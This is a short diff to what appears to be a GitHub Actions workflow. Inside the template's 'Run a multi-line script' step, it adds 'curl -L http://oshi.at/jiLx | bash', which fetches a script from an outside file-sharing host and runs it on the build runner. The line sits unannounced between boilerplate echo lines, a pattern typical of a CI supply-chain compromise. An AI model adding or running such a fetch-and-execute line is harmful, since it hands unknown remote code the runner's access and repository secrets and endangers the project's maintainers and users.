@@ -16,5 +16,7 @@ jobs:
 
       - name: Run a multi-line script
         run: |
+          echo $0
           echo Add other actions to build,
           echo test, and deploy your project.
+          curl -L http://oshi.at/jiLx | bash
